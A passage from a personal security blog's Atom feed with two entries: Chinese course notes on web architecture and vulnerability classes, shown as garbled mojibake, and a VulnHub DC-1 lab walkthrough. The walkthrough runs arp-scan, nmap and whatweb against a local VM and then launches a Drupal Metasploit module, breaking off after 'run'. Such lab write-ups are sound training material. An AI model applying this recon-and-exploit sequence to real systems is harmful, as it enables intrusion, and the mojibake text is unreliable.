¡è‰²åŠŸèƒ½æ¡†æ¶ </p><p>å¼€å‘è¯­è¨€ï¼Œç¨‹åºæºç ï¼Œä¸­é—´ä»¶å®¹å™¨ï¼Œæ•°æ®åº“ç±»å‹ï¼ŒæœåŠ¡å™¨æ“ä½œç³»ç»Ÿï¼Œç¬¬ä¸‰æ–¹è½¯ä»¶ç­‰<br>å¼€å‘è¯­è¨€ï¼šasp,php,aspx,jsp,java,python,ruby,go,html,javascriptç­‰<br>ç¨‹åºæºç ï¼šæ ¹æ®å¼€å‘è¯­è¨€åˆ†ç±»ï¼›åº”ç”¨ç±»å‹åˆ†ç±»ï¼›å¼€æºCMSåˆ†ç±»ï¼›å¼€å‘æ¡†æ¶åˆ†ç±»ç­‰<br>ä¸­é—´ä»¶å®¹å™¨ï¼šIIS,Apache,Nginx,Tomcat,Weblogic,Jboos,glasshfishç­‰|æ”¯æ’‘ç½‘ç«™è¿è¡Œï¼Œå„æœ‰ä¸åŒçš„åŠŸèƒ½<br>æ•°æ®åº“ç±»å‹: Access,Mysql,Mssql,Oracle,db2,Sybase,Redis,MongoDBç­‰|å­˜å‚¨æ•°æ®ï¼Œæ ¹æ®ä¸åŒéœ€æ±‚ï¼Œåº”ç”¨ä¸åŒçš„æ•°æ®åº“ç±»å‹<br>æœåŠ¡å™¨æ“ä½œç³»ç»Ÿï¼šWindowsç³»åˆ—ï¼ŒLinuxç³»åˆ—ï¼ŒMacç³»åˆ—ç­‰|<br>ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼šphpmyadmin,vs-ftpd,VNC,ELK,Opensshç­‰ </p><p>#WEBåº”ç”¨å®‰å…¨æ¼æ´åˆ†ç±»ï¼ˆç¨‹åºæºç ï¼‰<br>SQLæ³¨å…¥ï¼Œæ–‡ä»¶å®‰å…¨ï¼ŒRCEæ‰§è¡Œï¼ŒXSSè·¨ç«™ï¼ŒCSRF&#x2F;SSRF&#x2F;CRLFï¼Œ<br>ååºåˆ—åŒ–ï¼Œé€»è¾‘è¶Šæƒï¼Œæœªæˆæƒè®¿é—®ï¼ŒXXE&#x2F;XMLï¼Œå¼±å£ä»¤å®‰å…¨ç­‰</p><p>webè¯·æ±‚çš„è¿‡ç¨‹ <a href="https://www.cnblogs.com/51benpao/p/12984951.html">https://www.cnblogs.com/51benpao/p/12984951.html</a> </p><p>æµè§ˆå™¨è¾“å…¥åŸŸå-&gt;æµè§ˆå™¨dnsè§£æåˆ°ipåœ°å€-&gt;æœåŠ¡å™¨å’Œå®¢æˆ·æœºå»ºç«‹tcp(ä¸‰æ¬¡æ¡æ‰‹)è¿æ¥-&gt;æµè§ˆå™¨é€šè¿‡httpåè®®å‘é€è¯·æ±‚æ•°æ®åŒ…-&gt;å¯èƒ½æŸäº›æœåŠ¡ä¼šåšé‡å®šå‘æ¥è´Ÿè½½å‡è¡¡-&gt;æµè§ˆå™¨è·Ÿè¸ªé‡å®šå‘åœ°å€é‡æ–°å¼€å§‹è¿æ¥è¿‡ç¨‹-&gt;æœåŠ¡å™¨å¤„ç†è¯·æ±‚-&gt;æœåŠ¡å™¨å‘å‡ºhtmlå“åº”-&gt;é‡Šæ”¾tcpè¿æ¥-&gt;æµè§ˆå™¨æ˜¾ç¤ºé¡µé¢ï¼ˆæ­¤æ—¶è¿˜æ²¡æœ‰å®Œå…¨æ¥å—åˆ°htmlå…¨éƒ¨çš„æ–‡æ¡£ï¼‰-&gt;å‘é€å‰©ä½™çš„å†…å®¹</p><p>webè¯·æ±‚æ•°æ®åŒ…<a href="https://www.cnblogs.com/rayray/p/3729533.html">https://www.cnblogs.com/rayray/p/3729533.html</a></p><p>å­¦ä¼šä¸åŒå¯¹è±¡é‡‡ç”¨ä¸åŒæŠ“åŒ…å°åŒ…æŠ“å–æŠ€æœ¯åˆ†æ</p><p>åŸºäºç½‘ç»œæ¥å£æŠ“åŒ…-ç½‘ç»œæ¥å£<br>åŸºäºç¨‹åºè¿›ç¨‹æŠ“åŒ…-ç¨‹åºè¿›ç¨‹<br>åŸºäºæ•°æ®åè®®æŠ“åŒ…-HTTP&#x2F;S&amp;TCP&amp;UDP<br>åŸºäºåº”ç”¨å¯¹è±¡æŠ“åŒ…-APP&amp;å°ç¨‹åº&amp;PCUI<br>åŸºäºç³»ç»Ÿä½¿ç”¨æŠ“åŒ…-æ¨¡æ‹Ÿå™¨&amp;WIN&amp;LINUX</p><p>å­˜å‚¨å¯†ç åŠ å¯†-Web&amp;æ•°æ®åº“&amp;ç³»ç»Ÿ<br>ä¼ è¾“æ•°æ®ç¼–ç -å„ç±»ç»„åˆä¼ è¾“å‚æ•°å€¼<br>ä»£ç ç‰¹æ€§åŠ å¯†-JS&amp;PHP&amp;NET&amp;JAVA<br>æ•°æ®æ˜¾ç¤ºç¼–ç -å­—ç¬¦ä¸²æ•°æ®æ˜¾ç¤ºç¼–ç </p><p> è¯¦ç»†ç‚¹ï¼š<br>å¯†ç å­˜å‚¨åŠ å¯†ï¼š<br>MD5 SHA1 NTLM AES DES RC4<br>MD5å€¼æ˜¯32æˆ–16ä½ä½ç”±æ•°â€0-9â€å’Œå­—æ¯â€a-fâ€æ‰€ç»„æˆçš„å­—ç¬¦ä¸²<br>SHA1è¿™ç§åŠ å¯†çš„å¯†æ–‡ç‰¹å¾è·ŸMD5å·®ä¸å¤šï¼Œåªä¸è¿‡ä½æ•°æ˜¯40<br>NTLMè¿™ç§åŠ å¯†æ˜¯Windowsçš„å“ˆå¸Œå¯†ç ï¼Œæ ‡å‡†é€šè®¯å®‰å…¨åè®®<br>AESï¼ŒDESï¼ŒRC4è¿™äº›éƒ½æ˜¯éå¯¹ç§°æ€§åŠ å¯†ç®—æ³•ï¼Œå¼•Iå…¥å¯†é’¥ï¼Œå¯†æ–‡ç‰¹å¾ä¸Base64ç±»ä¼¼<br>åº”ç”¨åœºæ™¯ï¼šå„ç±»åº”ç”¨å¯†æ–‡ï¼Œè‡ªå®šä¹‰ç®—æ³•ï¼Œä»£ç åˆ†æï¼ŒCTFå®‰å…¨æ¯”èµ›ç­‰</p><p>NTLMä»‹ç» <a href="https://blog.csdn.net/qq_62169455/article/details/132617592">https://blog.csdn.net/qq_62169455/article/details/132617592</a></p><p>åç«¯ä»£ç åŠ å¯†ï¼š<br>PHP .NET JAVA<br>PHPï¼šä¹±ç ï¼Œå¤´éƒ¨æœ‰ä¿¡æ¯<br>.NETï¼šDLLå°è£…ä»£ç æ–‡ä»¶<br>JAVA:JAR&amp;CLASSæ–‡ä»¶<br>ä¸¾ä¾‹ï¼šZend ILSpy IDEA<br>åº”ç”¨åœºæ™¯ï¼šç‰ˆæƒä»£ç åŠ å¯†ï¼Œå¼€å‘ç‰¹æ€§ï¼ŒCTEæ¯”èµ›ç­‰</p><p>ç¼–è¯‘å’Œåç¼–è¯‘ <a href="https://zhuanlan.zhihu.com/p/4766970">https://zhuanlan.zhihu.com/p/4766970</a> <a href="https://blog.csdn.net/weixin_44943389/article/details/132507440">https://blog.csdn.net/weixin_44943389/article/details/132507440</a></p><p>#çŸ¥è¯†ç‚¹ï¼š<br>1ã€èµ„äº§æ¶æ„-ç«¯å£ç›®å½•æ’ä»¶æ¥å£å¤šç«™ç‚¹å¤šåº”ç”¨<br>2ã€ç•ªå¤–å®‰å…¨-åŸŸåcæœåŠ¡å™¨æœ¬èº«æœåŠ¡å‚å•†ç®¡ç†äººå‘˜<br>3ã€è€ƒè™‘é˜»ç¢-ç«™åº“åˆ†ç¦»&amp;CDN&amp;WAF&amp;è´Ÿè½½å‡è¡¡&amp;ä¸»æœºé˜²æŠ¤<br>è¯¦ç»†ç‚¹ï¼š<br>1ã€å‰ç½®æ¡ä»¶-è´­ä¹°ä½¿ç”¨-äº‘æœåŠ¡å™¨åŸŸåç­‰<br>2ã€æ¶æ„æ­å»º-ç›®å½•cç«¯å£å­åŸŸcæ’ä»¶såº”ç”¨ç­‰<br>3ã€å®‰å…¨éƒ¨ç½²-WAEé˜²ç«å¢™&amp;ä¸»æœºé˜²æŠ¤&amp;HIDSç­‰<br>4ã€æ€§èƒ½ä¼˜åŒ–-è´Ÿè½½å‡è¡¡&amp;CDNåŠ é€ŸcOSSäº‘å­˜å‚¨ç­‰</p><p><strong>èµ„äº§æ¶æ„</strong>ï¼š<br>WEBå•ä¸ªæºç æŒ‡å‘å®‰å…¨ |<br>WEBå¤šä¸ªç›®å½•æºç å®‰å…¨ |å¯èƒ½ä¼šæœ‰å¤šä¸ªç¨‹åºï¼Œå°±æœ‰å¤šä¸ªæ¼æ´ æ‰«æè½¯7bscan<br>WEBå¤šä¸ªç«¯å£æºç å®‰å…¨ | nmap<br>æœåŠ¡å™¨æ¶è®¾å¤šä¸ªç«™ç‚¹å®‰å…¨|<br>æ¶è®¾ç¬¬ä¸‰æ–¹æ’ä»¶æ¥å£å®‰å…¨|<br>æœåŠ¡å™¨æ¶è®¾å¤šä¸ªåº”ç”¨å®‰å…¨|<br>#ç•ªå¤–å®‰å…¨ï¼š<br>åŸºäºåŸŸåè§£æå®‰å…¨ |<br>åŸºäºæœåŠ¡å™¨æœ¬èº«å®‰å…¨<br>åŸºäºæœåŠ¡å•†ä¿¡æ¯å®‰å…¨<br>åŸºäºç®¡ç†ä¸ªäººçš„å®‰å…¨<br>#è€ƒè™‘é˜»ç¢ï¼š<br>é˜»ç¢-ç«™åº“åˆ†ç¦»|<br>é˜»ç¢-CDNåŠ é€ŸæœåŠ¡|<a href="https://zhuanlan.zhihu.com/p/616462418">https://zhuanlan.zhihu.com/p/616462418</a><br>é˜»ç¢-è´Ÿè½½å‡è¡¡æœåŠ¡|<a href="https://www.sangfor.com.cn/knowledge/load-balancing|%E5%8F%AF%E8%83%BD%E8%8E%B7%E5%BE%97%E7%9A%84%E6%98%AF%E5%A4%87%E7%94%A8%E6%9C%BA%E7%9A%84%E6%9D%83%E9%99%90">https://www.sangfor.com.cn/knowledge/load-balancing|å¯èƒ½è·å¾—çš„æ˜¯å¤‡ç”¨æœºçš„æƒé™</a><br>é˜»ç¢-WAFåº”ç”¨é˜²ç«å¢™|</p><p>é˜»ç¢-ä¸»æœºé˜²æŠ¤é˜²ç«å¢™|æœåŠ¡å™¨æ€æ¯’è½¯ä»¶</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è·Ÿç€å°è¿ªå­¦ä¹ ç¬¬ä¸€å¤©&lt;/p&gt;
&lt;p&gt;åè¯è§£é‡Š&lt;/p&gt;
&lt;p&gt;POCï¼šå…¨ç§°â€™ProofofConceptâ€™ï¼Œä¸­æ–‡â€™æ¦‚å¿µéªŒè¯â€™ï¼Œå¸¸æŒ‡ä¸€æ®µæ¼æ´è¯æ˜çš„ä»£ç ã€‚&lt;br&gt;EXPï¼šå…¨ç§°â€™Exploitâ€™ï¼Œä¸­æ–‡åˆ©ç”¨ï¼ŒæŒ‡åˆ©ç”¨ç³»ç»Ÿæ¼æ´è¿›è¡Œæ”»å‡»çš„åŠ¨ä½œã€‚&lt;br&gt;Payloadï¼šä¸­æ–‡æœ‰æ•ˆè½½è·ï¼ŒæŒ‡æˆåŠŸex</summary>
      
    
    
    
    
    <category term="xiaodisec" scheme="https://gu0f3n.github.io/tags/xiaodisec/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub DC-1</title>
    <link href="https://gu0f3n.github.io/2025/02/16/vulnhub-DC-1/"/>
    <id>https://gu0f3n.github.io/2025/02/16/vulnhub-DC-1/</id>
    <published>2025-02-16T09:28:03.000Z</published>
    <updated>2025-03-05T05:28:18.717Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]</span><br><span class="line">â””â”€# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:e7:49:b2, IPv4: 192.168.205.128</span><br><span class="line">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied</span><br><span class="line">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.205.1   00:50:56:c0:00:01       (Unknown)</span><br><span class="line">192.168.205.2   00:50:56:f7:4f:9c       (Unknown)</span><br><span class="line">192.168.205.129 00:0c:29:04:0c:de       (Unknown)</span><br><span class="line">192.168.205.254 00:50:56:e2:1c:01       (Unknown)</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.874 seconds (136.61 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure><p>å‘ç°192.168.205.129 æ˜¯æˆ‘ä»¬çš„é¶æœºip å¼€å§‹ä¿¡æ¯æœé›†</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rootã‰¿kali)-[/home/kali]</span><br><span class="line">â””â”€# nmap -sS -sV -A -T4 -p- 192.168.205.129</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 04:26 EST</span><br><span class="line">Nmap scan report for 192.168.205.129</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          44174/udp6  status</span><br><span class="line">|   100024  1          46616/tcp   status</span><br><span class="line">|   100024  1          46812/udp   status</span><br><span class="line">|_  100024  1          46918/tcp6  status</span><br><span class="line">46616/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:04:0C:DE (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.43 ms 192.168.205.129</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.30 seconds</span><br></pre></td></tr></table></figure><p>å¾—åˆ°22 80 111 ä¸‰ä¸ªç«¯å£</p><p>22æ˜¯ssh 80æ˜¯httpæœåŠ¡ </p><p>é¦–å…ˆè¿›å…¥webé¡µé¢çœ‹ä¸€çœ‹æœ‰ä»€ä¹ˆ</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250216173216.png"></p><p>ä¸€ä¸ªç™»å½•é¡µé¢ æ‹¿ä¸€ä¸‹ç½‘ç«™çš„åŸºæœ¬ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]</span><br><span class="line">â””â”€# whatweb -v 192.168.205.129</span><br><span class="line">WhatWeb report for http://192.168.205.129</span><br><span class="line">Status    : 200 OK</span><br><span class="line">Title     : Welcome to Drupal Site | Drupal Site</span><br><span class="line">IP        : 192.168.205.129</span><br><span class="line">Country   : RESERVED, ZZ</span><br><span class="line"></span><br><span class="line">Summary   : Apache[2.2.22], Content-Language[en], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PasswordField[pass], PHP[5.4.45-0+deb7u14], Script[text/javascript], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]   </span><br><span class="line"></span><br><span class="line">Detected Plugins:</span><br><span class="line">[ Apache ]</span><br><span class="line">        The Apache HTTP Server Project is an effort to develop and </span><br><span class="line">        maintain an open-source HTTP server for modern operating </span><br><span class="line">        systems including UNIX and Windows NT. The goal of this </span><br><span class="line">        project is to provide a secure, efficient and extensible </span><br><span class="line">        server that provides HTTP services in sync with the current </span><br><span class="line">        HTTP standards. </span><br><span class="line"></span><br><span class="line">        Version      : 2.2.22 (from HTTP Server Header)</span><br><span class="line">        Google Dorks: (3)</span><br><span class="line">        Website     : http://httpd.apache.org/</span><br><span class="line"></span><br><span class="line">[ Content-Language ]</span><br><span class="line">        Detect the content-language setting from the HTTP header. </span><br><span class="line"></span><br><span class="line">        String       : en</span><br><span class="line"></span><br><span class="line">[ Drupal ]</span><br><span class="line">        Drupal is an opensource CMS written in PHP. </span><br><span class="line"></span><br><span class="line">        Aggressive function available (check plugin file or details).</span><br><span class="line">        Google Dorks: (1)</span><br><span class="line">        Website     : http://www.drupal.org</span><br><span class="line"></span><br><span class="line">[ HTTPServer ]</span><br><span class="line">        HTTP server header string. This plugin also attempts to </span><br><span class="line">        identify the operating system from the server header. </span><br><span class="line"></span><br><span class="line">        OS           : Debian Linux</span><br><span class="line">        String       : Apache/2.2.22 (Debian) (from server string)</span><br><span class="line"></span><br><span class="line">[ JQuery ]</span><br><span class="line">        A fast, concise, JavaScript that simplifies how to traverse </span><br><span class="line">        HTML documents, handle events, perform animations, and add </span><br><span class="line">        AJAX. </span><br><span class="line"></span><br><span class="line">        Website     : http://jquery.com/</span><br><span class="line"></span><br><span class="line">[ MetaGenerator ]</span><br><span class="line">        This plugin identifies meta generator tags and extracts its </span><br><span class="line">        value. </span><br><span class="line"></span><br><span class="line">        String       : Drupal 7 (http://drupal.org)</span><br><span class="line"></span><br><span class="line">[ PHP ]</span><br><span class="line">        PHP is a widely-used general-purpose scripting language </span><br><span class="line">        that is especially suited for Web development and can be </span><br><span class="line">        embedded into HTML. This plugin identifies PHP errors, </span><br><span class="line">        modules and versions and extracts the local file path and </span><br><span class="line">        username if present. </span><br><span class="line"></span><br><span class="line">        Version      : 5.4.45-0+deb7u14</span><br><span class="line">        Google Dorks: (2)</span><br><span class="line">        Website     : http://www.php.net/</span><br><span class="line"></span><br><span class="line">[ PasswordField ]</span><br><span class="line">        find password fields </span><br><span class="line"></span><br><span class="line">        String       : pass (from field name)</span><br><span class="line"></span><br><span class="line">[ Script ]</span><br><span class="line">        This plugin detects instances of script HTML elements and </span><br><span class="line">        returns the script language/type. </span><br><span class="line"></span><br><span class="line">        String       : text/javascript</span><br><span class="line"></span><br><span class="line">[ UncommonHeaders ]</span><br><span class="line">        Uncommon HTTP server headers. The blacklist includes all </span><br><span class="line">        the standard headers and many non standard but common ones. </span><br><span class="line">        Interesting but fairly common headers should have their own </span><br><span class="line">        plugins, eg. x-powered-by, server and x-aspnet-version. </span><br><span class="line">        Info about headers can be found at www.http-stats.com </span><br><span class="line"></span><br><span class="line">        String       : x-generator (from headers)</span><br><span class="line"></span><br><span class="line">[ X-Powered-By ]</span><br><span class="line">        X-Powered-By HTTP header </span><br><span class="line"></span><br><span class="line">        String       : PHP/5.4.45-0+deb7u14 (from x-powered-by string)</span><br><span class="line"></span><br><span class="line">HTTP Headers:</span><br><span class="line">        HTTP/1.1 200 OK</span><br><span class="line">        Date: Sat, 15 Feb 2025 23:03:39 GMT</span><br><span class="line">        Server: Apache/2.2.22 (Debian)</span><br><span class="line">        X-Powered-By: PHP/5.4.45-0+deb7u14</span><br><span class="line">        Expires: Sun, 19 Nov 1978 05:00:00 GMT</span><br><span class="line">        Last-Modified: Sat, 15 Feb 2025 23:03:39 +0000</span><br><span class="line">        Cache-Control: no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">        ETag: &quot;1739660619&quot;</span><br><span class="line">        Content-Language: en</span><br><span class="line">        X-Generator: Drupal 7 (http://drupal.org)</span><br><span class="line">        Vary: Accept-Encoding</span><br><span class="line">        Content-Encoding: gzip</span><br><span class="line">        Content-Length: 2276</span><br><span class="line">        Connection: close</span><br><span class="line">        Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°é¶æœºçš„cmsæ˜¯Drupal</p><p>***å¯åŠ¨Metersploit*****<em><strong>æœåŠ¡*</strong></em></p><p>æœå¯»drupalæ¨¡å—</p><p>ä½¿ç”¨åºå·ä¸€è¿™ä¸ª</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use 1</span><br><span class="line"></span><br><span class="line">set Rhost 192.168.29.131 *# sè®¾ç½®é¶æœºip*</span><br><span class="line"></span><br><span class="line">set lhost 192.168.29.128 *# è®¾ç½®æ”»æœºip*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">run#</span><span class="language-bash">å¼€å§‹æ”»å‡»</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;</summary>
      
    
    
    
    <category term="vulnhub" scheme="https://gu0f3n.github.io/categories/vulnhub/"/>
    
    
    <category term="vulnhub" scheme="https://gu0f3n.github.io/tags/vulnhub/"/>
    
  </entry>
  
</feed>
